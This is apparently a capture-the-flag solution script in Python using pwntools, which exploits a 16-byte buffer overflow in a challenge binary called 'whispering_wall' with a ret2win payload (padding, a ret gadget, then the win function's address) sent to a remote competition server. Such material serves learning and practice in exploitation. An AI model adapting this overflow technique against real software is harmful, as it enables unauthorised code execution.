#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./whispering_wall', checksec=False)
OFFSET_TO_RIP = 16+8 #<-- offset to RBP computed with cycle(when the program breaks see the RBP register value)+ 8 since rbp have 8 byte
ret_gadget = 0x40101a


"""
BUFFER[16]
RBP[8]
RIP <-- Target
"""
#It's a simple ret2win strategy, without the canary.

REMOTE_HOST,HOST_PORT= 'offsec.m0lecon.it', 13553
p= remote(REMOTE_HOST,HOST_PORT)

#p = process(elf.path)
p.recvuntil(b"whisper:\n")
payload = flat( b'A' * OFFSET_TO_RIP, p64(ret_gadget), p64(elf.sym.win),)
p.send(payload)
p.interactive()


